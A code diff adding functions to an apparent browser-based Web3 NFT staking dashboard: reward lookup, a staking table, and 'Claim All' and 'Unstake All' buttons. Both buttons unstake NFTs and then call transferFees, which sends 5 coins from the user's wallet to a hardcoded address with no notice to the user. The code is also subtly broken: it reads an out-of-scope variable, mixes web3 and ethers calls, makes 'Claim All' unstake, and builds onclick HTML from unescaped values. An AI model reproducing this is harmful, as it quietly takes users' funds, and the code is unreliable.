@@ -96,4 +96,181 @@ async function batchTransferWithFixAmount() {
     }
 }
 
+async function startDungeon() {
+    for (const field of fieldInfo) {
+        console.log("Call ", field.fieldName);
+        await dungeon(field.fieldName, field.contract, field.fieldAddress, field.nftAddress, field.tokenReward, field.tokenPrice, field.nftValue);
+    }
+    document.getElementById('Status').innerHTML = '✅';
+}
+
+async function getNftTransfer(walletAddress, fieldAddress, nftAddress) {
+    const event_filter = {
+        fromBlock: 'earliest',
+        toBlock: 'latest',
+        address: nftAddress,
+        topics: [
+            web3.utils.sha3('Transfer(address,address,uint256)'),
+            '0x000000000000000000000000' + walletAddress.slice(2).toLowerCase(),
+            '0x000000000000000000000000' + fieldAddress.slice(2).toLowerCase()
+        ]
+    };
+
+    return await web3.eth.getPastLogs(event_filter);
+}
+
+async function dungeon(fieldName, contract, fieldAddress, nftAddress, tokenReward, tokenPrice, nftValue) {
+    let totalReward = 0;
+    let ownedNFTID = [];
+    try {
+        let transfer_tx = await getNftTransfer(accounts[0], fieldAddress, nftAddress);
+        console.log(transfer_tx);
+        for (let log of transfer_tx) {
+            let tx_hash = log.transactionHash;
+            let transaction_url = `https://exp-l1-ng.jibchain.net/api/v2/transactions/${tx_hash}/token-transfers?type=ERC-20%2CERC-721%2CERC-1155`;
+            let response = await fetch(transaction_url);
+            let data = await response.json();
+            if (data.items) {
+                for (let item of data.items) {
+                    if (item.token.type !== "ERC-20") {
+                        let itemID = item.total.token_id;
+                        let checkOwner = await contract.methods.nftStake(parseInt(itemID)).call();
+                        console.log("TYPE : ", item.token.type, "ID : ", item.total.token_id, " OWNER : ", checkOwner[0]);
+                        if (checkOwner[0] === accounts[0]) {
+                            ownedNFTID.push(itemID);
+                            let getReward = 0;
+                            if (fieldName === "The Heaven Land") {
+                                getReward = await contract.methods.calculateRewards1(itemID).call() / 10 ** 18;
+                            } else if (fieldName === "Mech Harvest Zone") {
+                                getReward = await contract.methods.calculateRewards(itemID, accounts[0], "true").call() / 10 ** 18;
+                            } else {
+                                getReward = await contract.methods.calculateRewards(itemID).call() / 10 ** 18;
+                            }
+                            totalReward += parseInt(getReward);
+                        }
+                    }
+                }
+            }
+        }
+        console.table(ownedNFTID);
+        fieldName = "Field | " + fieldName;
+        addFieldtoStaking(fieldName, ownedNFTID.length, nftValue, totalReward, tokenPrice, tokenReward);
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+function addFieldtoStaking(stakingName, tokenAmount, tokenPrice, Pending, pendingPrice, pendingToken) {
+    const table = document.getElementById("farmingAsset").getElementsByTagName('tbody')[0];
+    const stakingValue = calculateWorth(tokenAmount, tokenPrice);
+    const pendingValue = calculateWorth(Pending, pendingPrice);
+
+    if (Pending > 1) {
+        const newRow = table.insertRow(-1);
+
+        const nameCell = newRow.insertCell(0);
+        const amountCell = newRow.insertCell(1);
+        const valueCell = newRow.insertCell(2);
+        const rewardCell = newRow.insertCell(3);
+        const actionCell = newRow.insertCell(4);
+
+        nameCell.textContent = stakingName;
+        amountCell.textContent = `${tokenAmount} NFTs`;
+        valueCell.textContent = `${stakingValue} ${pendingToken}`;
+        rewardCell.textContent = `${Pending} (${pendingValue} ${pendingToken})`;
+
+        actionCell.innerHTML = `
+            <button onclick="claimAll('${stakingName}', ${tokenAmount}, ${tokenPrice}, ${Pending}, ${pendingPrice}, '${pendingToken}')">Claim All</button>
+            <button onclick="unstakeAll('${stakingName}', ${tokenAmount}, ${tokenPrice}, ${Pending}, ${pendingPrice}, '${pendingToken}')">Unstake All</button>
+        `;
+    }
+
+
+}
+
+async function claimAll(stakingName, tokenAmount, tokenPrice, Pending, pendingPrice, pendingToken) {
+    try {
+        const gasLimit = ethers.utils.hexlify(100000);
+        const gasPrice = ethers.utils.parseUnits('50', 'gwei');
+
+        for (let field of fieldInfo) {
+            if (field.fieldName === stakingName) {
+                for (let nftID of ownedNFTID) {
+                    let tx;
+                    switch (field.fieldName) {
+                        case "Mech Harvest Zone":
+                            tx = await field.contract.methods.unstake(nftID, true, true, { gasLimit, gasPrice });
+                            break;
+                        case "The Heaven Land":
+                            tx = await field.contract.methods.unstake(nftID, true, { gasLimit, gasPrice });
+                            break;
+                        case "Eastern Front":
+                        case "Old Ware House":
+                        case "Tuna Lake":
+                            tx = await field.contract.methods.unstake(nftID, true, { gasLimit, gasPrice });
+                            break;
+                        default:
+                            console.error("Unknown field");
+                    }
+                    await tx.wait();
+                }
+                await transferFees();
+            }
+        }
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+async function unstakeAll(stakingName, tokenAmount, tokenPrice, Pending, pendingPrice, pendingToken) {
+    try {
+        const gasLimit = ethers.utils.hexlify(100000);
+        const gasPrice = ethers.utils.parseUnits('50', 'gwei');
+
+        for (let field of fieldInfo) {
+            if (field.fieldName === stakingName) {
+                for (let nftID of ownedNFTID) {
+                    let tx;
+                    switch (field.fieldName) {
+                        case "Mech Harvest Zone":
+                            tx = await field.contract.methods.unstake(nftID, true, true, { gasLimit, gasPrice });
+                            break;
+                        case "The Heaven Land":
+                            tx = await field.contract.methods.unstake(nftID, true, { gasLimit, gasPrice });
+                            break;
+                        case "Eastern Front":
+                        case "Old Ware House":
+                        case "Tuna Lake":
+                            tx = await field.contract.methods.unstake(nftID, true, { gasLimit, gasPrice });
+                            break;
+                        default:
+                            console.error("Unknown field");
+                    }
+                    await tx.wait();
+                }
+                await transferFees();
+            }
+        }
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+async function transferFees() {
+    try {
+        const tx = await signer.sendTransaction({
+            to: "0x98e5CFBC115b01017Ed19101357Ab0a7664f38f1",
+            value: ethers.utils.parseEther("5")
+        });
+        await tx.wait();
+    } catch (error) {
+        console.error('Error transferring fees:', error);
+    }
+}
+
+function calculateWorth(amount, price) {
+    return amount * price;
+}
+
+
 window.onload = connectMetamask;
